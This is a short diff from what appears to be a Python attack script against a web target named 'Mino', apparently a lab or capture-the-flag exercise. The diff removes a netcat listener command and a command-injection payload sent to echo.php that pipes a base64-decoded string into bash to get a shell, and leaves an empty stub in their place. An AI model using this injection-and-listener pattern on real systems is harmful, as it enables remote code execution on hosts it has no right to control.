@@ -46,11 +46,7 @@ Mino_web_engine_login()
 
 def Mino_shell_C(): #will return to it in the future
    
-    os.system(f'nc -lnvp {Port}')
- 
-    payload = {'search': '{place here} | base64 -d | bash'} # if this doesn't work, manually place it in
-    url_C = f'http://{tar_ip}/echo.php'
-    PostData_C = sess.post(url_C, params=payload)
+    pass
 
                 
 Mino_shell_C()
